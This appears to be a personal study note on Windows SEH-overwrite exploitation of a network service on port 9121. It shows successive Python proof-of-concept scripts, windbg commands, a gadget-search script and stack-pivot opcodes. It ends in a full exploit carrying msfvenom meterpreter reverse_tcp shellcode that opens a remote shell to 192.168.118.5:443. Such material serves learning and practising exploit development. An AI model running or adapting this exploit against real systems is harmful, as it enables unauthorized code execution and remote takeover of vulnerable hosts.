# SEH
The poc for this pow is the following 
```
#!/usr/bin/python

import sys 
import socket
from struct import pack

server = sys.argv[1]

port = 9121
size = 1000

inputBuffer = b"\x41" * size

header =  "\x75\x19\xba\xab"
header += "\x03\x00\x00\x00"
header += "\x00\x40\x00\x00"
header += pack('<I', len(inputBuffer))
header += pack('<I', len(inputBuffer))
header += pack('<I', ord(inputBuffer[-1]))


buf = header + inputBuffer


try:
    
    print ("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    print("Done !")

except:

    print("[-] Unable to communicate to target %s:%s" %(server,port)) 
```
## Understanding the SEH 
### Walk the exception list in windbg after crash
_EXCEPTION_REGISTRATION_RECORD structures is saved in the stack
```
!teb #take ExceptionList address

dt _EXCEPTION_REGISTRATION_RECORD 01c4fe1c #01c4fe1c will be the exception list address

#take the Next address

dt _EXCEPTION_REGISTRATION_RECORD 0x01c4ff54 #0x01c4ff54 will be the next address previously grabbed    

```
### List the current thread exception handler chain - Instead of the manual process (consider the last address shown as the handler address)
```
!exchain
```
Inspect the callstack (**k**) to determine which functions were called before the eip was overwritten

## Gaining Code Execution
### Determine the exact offset required to precisely overwrite the exception handler on the stack.
```
msf-pattern_create -l 1000
```
The new pow
```
server = sys.argv[1]

port = 9121
size = 1000

inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8...Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
```
In windbg
```
!exchain
```
In kali
```
msf-pattern_offset - l 1000 -q 33654132 # 33654132 being the address of the handler got with exchain
```
The new pow
```
server = sys.argv[1]

port = 9121
size = 1000

inputBuffer = b"\x41" * 128 # 128 being the size got with msf-pattern_offset
inputBuffer += b"\x42\x42\x42\x42"
inputBuffer+= b"\x43" * (size - len(inputBuffer))
```
Run `!exchain` to confirm the handler address is overwritten by `\x42\x42\x42\x42` 
### Detect Bad charcaters
```
badchars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
    "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
    "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
    "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
    "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
    "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )
```

The pow
```
inputBuffer = b"\x41" * 128
inputBuffer+= b"\x42\x42\x42\x42"
inputBuffer += badchars
inputBuffer+= b"\x43" * (size - len(inputBuffer))
```
The instruction pointer should be overwritten with the second argument (EstablisherFrame) passed to the _except_handler function (in the stack). In order to check the bad chars:
```
dds esp L5
db 0132ff54 # 0x0132ff54 being the address of the second argument of ntdll!ExecuteHandler2 function noticed in the top of the stack
```

### Finding a P/P/R Instruction Sequence
```
.load narly
!nmod

#scripting
# should be placed in a ".wds" file (ex C:\Users\vagrant\Desktop\find_ppr.wds)
#here 10000000 and 10226000 are start and end address of the module (with “/SafeSEH OFF” and not containing bad chars) to check for P/P/R instruction

.block
{
    .for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)
    {
        .for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)
        {
            s-[1]b 10000000 10226000 $t0 $t1 c3
        }
    }
}
```
We execute this in the windows machine 
`$><C:\Users\vagrant\Desktop\find_ppr.wds`
Once an address is picked (assumed 0x1015a2f0 here), this is the new poc
```
inputBuffer = b"\x41" * 128
inputBuffer += pack("<L" , (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax ; pop ebx ; ret
inputBuffer+= b"\x43" * (size - len(inputBuffer))
```
Break point at this address in debugger
`bp 0x1015a2f0`


### Write the Next SEH (offset - 4)
The handler is execute then the next handler 
The after executing the P/P/R, we should be redirected to the Next Handler address overwriiten with 41 41 41 41 (4 bytes before the offset which is 128 here)
The new pow
```
inputBuffer = b"\x41" * 124 
inputBuffer += b"\x42" * 4 # (NSEH)
inputBuffer += pack("<L" , (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax ; pop ebx ; ret
inputBuffer += b"\x43" * (size - len(inputBuffer))
```
### if a jump is needed
```
u eip
dds esp
```
If a small jump is needed to escape some junk code like `lock ...` (causing access violation), assembl the instruction from the current place of the assembly
```
a
jmp 0x018fff5c
u eip L1 # this will give the opcode
```
The upcode will be addes for the NSEH before the SEH handler
The new pow becomes 
```
try:
    server = sys.argv[1]
    port = 9121
    size = 1000

    inputBuffer = b"\x41" * 124 # (offset - 4)
    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
    inputBuffer+= b"\x42" * (size - len(inputBuffer))
```

The shellcode is not fully taken after the SEH handler ? Check if **all** the shellcode is appearing and which part is taken 
```
dd eip L30
!teb # and compare the Stack base with the first eip address
```
If not, search the stack and see if we can find all the shellcode (with dummy and unique value for search: here will be ... 90 90 90 90 41 41 41 41 ...)

The new pow
```
try:
    server = sys.argv[1]
    port = 9121
    size = 1000

    shellcode = b"\x43" * 400
    inputBuffer = b"\x41" * 124
    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
    inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode)) #the most important part
    inputBuffer+= shellcode
```
We can perform a search for the NOP instructions followed by the bytes contained in our shellcode variable **right after taking our short jump of NSEH (0x06eb9090)**

```
!teb
s -b 01aee000 01af0000 90 90 90 90 43 43 43 43 43 43 43 43 # 01aee000 being the stacklimit printed by teb and 01af0000 the stackbase

dd 01aefc70 L65 #01aefc70 being the result of the search
```

The next step is to determine the offset from the current stack pointer to the beginning of the shellcode. This will allow us to use the limited space we have to assemble a set of instructions that will allow us to "island hop", redirecting execution to our shellcode.
```
? 01aefc74 - @esp # 01aefc70 is the address from which the 43 43 43 43 is stating 
# the result of this operation will be in hex
```
let's assemble a few instructions to increase the stack pointer by 0x830 bytes followed by a "jmp esp" to jump to the shellcode next.
```
kali@kali:~$ msf-nasm_shell
nasm > add sp, 0x830 # 830 being the result of the previous operation; make sure there is no null bytes
nasm > jmp esp
```
Update the pow to include the ADD assembly instruction, followed by a "jmp esp" to redirect the execution flow to the shellcode
```
try:
    server = sys.argv[1]
    port = 9121
    size = 1000

    shellcode = b"\x90" * 8
    shellcode+= b"\x43" * (400 - len(shellcode))

    inputBuffer = b"\x41" * 124
    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH) 
    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
    inputBuffer+= b"\x90" * 2
    inputBuffer+= b"\x66\x81\xc4\x30\x08" # add sp, 0x830
    inputBuffer+= b"\xff\xe4" # jmp esp
    inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
    inputBuffer+= shellcode
```

### Obtaining a Shell
```
try:
    server = sys.argv[1]
    port = 9121
    size = 1000
    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode
    shellcode = b"\x90" * 20
    shellcode += b""
    shellcode += b"\xdb\xdd\xb8\xb3\xe9\xc8\x0b\xd9\x74\x24\xf4"
    ...
    shellcode += b"\xc8\xed\x4c\x07\x0f\x2e\xeb\x18\x3a\x13\x5a"
    shellcode+= b"\x43" * (400 - len(shellcode))
    inputBuffer = b"\x41" * 124
    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
    inputBuffer+= b"\x90" * 2
    inputBuffer+= b"\x66\x81\xc4\x30\x08" # add sp, 0x830
    inputBuffer+= b"\xff\xe4" # jmp esp
    inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
    inputBuffer+= shellcode

    header = b"\x75\x19\xba\xab"
    header += b"\x03\x00\x00\x00"
    header += b"\x00\x40\x00\x00"
    header += pack('<I', len(inputBuffer))
    header += pack('<I', len(inputBuffer))
    header += pack('<I', inputBuffer[-1])
    buf = header + inputBuffer
    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()
```

## Short/Long jump to shellcode
The full shellcode may not be located at the begenning of the stack, so you should search it address in the stack

## shellcode 

### inspect the callstack (k) to determine which functions were called before the eip was overwritten

## Island hooping 
after P/P/R, `u eip` or `dds esp` 
do we need to jump ? if yes
```
a
jmp 0x018fff5c # 0x018fff5c being here where we want to jump to from the current step
u eip L1 # this will give the assembly opcode for the jump
dds eip L4